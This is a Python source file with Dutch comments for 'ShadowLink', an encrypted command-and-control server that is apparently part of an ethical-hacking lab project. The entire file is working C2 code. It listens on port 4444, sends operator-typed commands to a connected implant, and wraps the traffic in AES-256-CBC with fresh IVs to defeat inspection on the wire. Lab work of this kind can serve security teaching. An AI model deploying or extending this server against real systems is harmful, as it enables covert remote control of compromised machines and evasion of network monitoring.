#!/usr/bin/env python3
"""
ShadowLink C2 server - Fase 2 v2 (AES-256 versleutelde C2-communicatie)

Verschil met v1: alle payload-bytes worden versleuteld met AES-256-CBC
(pycryptodome) voor ze op de socket gaan:
  bericht = lengteprefix || IV (16B, random) || AES-CBC(plaintext, PKCS7)

- De 256-bit sleutel wordt afgeleid van een gedeelde passphrase via SHA-256
  (in echte tooling gebruik je een KDF zoals PBKDF2/scrypt, maar voor deze
  labo-PoC volstaat dit).
- Per bericht een verse random IV => identieke commando's geven telkens
  andere ciphertext (beschermt tegen patroonanalyse op de draad).
- Test in Fase 7 met Wireshark dat de inhoud onleesbaar is.
"""
import hashlib
import socket
import struct

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

HOST = "0.0.0.0"
PORT = 4444
PASSPHRASE = b"ShadowLink-EH-2026"          # gedeeld met client (labo)
KEY = hashlib.sha256(PASSPHRASE).digest()  # 32 bytes = AES-256


def encrypt(plaintext: bytes) -> bytes:
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(plaintext, AES.block_size))


def decrypt(blob: bytes) -> bytes:
    iv, ct = blob[:AES.block_size], blob[AES.block_size:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)


def send_msg(conn, plaintext: bytes):
    blob = encrypt(plaintext)
    conn.sendall(struct.pack("!I", len(blob)) + blob)


def recv_msg(conn) -> bytes | None:
    header = b""
    while len(header) < 4:
        chunk = conn.recv(4 - len(header))
        if not chunk:
            return None
        header += chunk
    length = struct.unpack("!I", header)[0]

    blob = b""
    while len(blob) < length:
        chunk = conn.recv(min(4096, length - len(blob)))
        if not chunk:
            return None
        blob += chunk
    return decrypt(blob)


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] ShadowLink C2 (AES-256) luistert op {HOST}:{PORT} ...")

    conn, addr = server.accept()
    print(f"[+] Versleutelde sessie van {addr[0]}:{addr[1]}")

    try:
        while True:
            cmd = input("shadowlink> ").strip()
            if not cmd:
                continue

            send_msg(conn, cmd.encode())

            if cmd.lower() in ("exit", "quit"):
                print("[*] Sessie afgesloten.")
                break

            result = recv_msg(conn)
            if result is None:
                print("[-] Client heeft de verbinding verbroken.")
                break
            print(result.decode("utf-8", errors="replace"))
    except (ValueError, KeyError) as e:
        # ValueError bij unpad = verkeerde sleutel / gemanipuleerde ciphertext
        print(f"[-] Decryptiefout: {e}")
    except KeyboardInterrupt:
        print("\n[*] Onderbroken door gebruiker.")
    finally:
        conn.close()
        server.close()


if __name__ == "__main__":
    main()

